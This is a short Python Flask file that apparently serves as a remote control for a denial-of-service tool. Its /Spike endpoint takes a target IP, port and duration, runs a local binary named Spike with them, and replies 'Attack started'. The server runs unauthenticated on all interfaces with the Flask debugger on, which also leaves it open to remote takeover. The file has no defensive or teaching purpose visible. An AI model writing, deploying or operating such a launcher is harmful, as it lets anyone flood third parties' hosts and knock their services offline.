from flask import Flask, request, jsonify
import logging
import subprocess

app = Flask(__name__)

# Enable logging
logging.basicConfig(level=logging.DEBUG)

@app.route('/Spike', methods=['GET'])
def handle_spike():
    try:
        ip = request.args.get('ip')
        port = request.args.get('port')
        time = request.args.get('time')

        # Log the incoming request
        app.logger.debug(f'Received IP: {ip}, Port: {port}, Time: {time}')

        if not ip or not port or not time:
            raise ValueError('Missing parameters')

        # Run the binary with subprocess
        command = ['./Spike', ip, port, time]
        app.logger.debug(f'Running command: {" ".join(command)}')
        
        # Execute the command
        result = subprocess.run(command, capture_output=True, text=True)

        # Check if the command was successful
        if result.returncode != 0:
            raise RuntimeError(f"Error running binary: {result.stderr}")

        # Process the output if needed
        output = result.stdout.strip()

        # Send response
        response = {
            'status': 'Attack started',
            'ip': ip,
            'port': port,
            'time': time,
            'output': output
        }
        return jsonify(response)

    except Exception as e:
        app.logger.error(f"Error: {e}")
        return jsonify({'error': str(e)}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
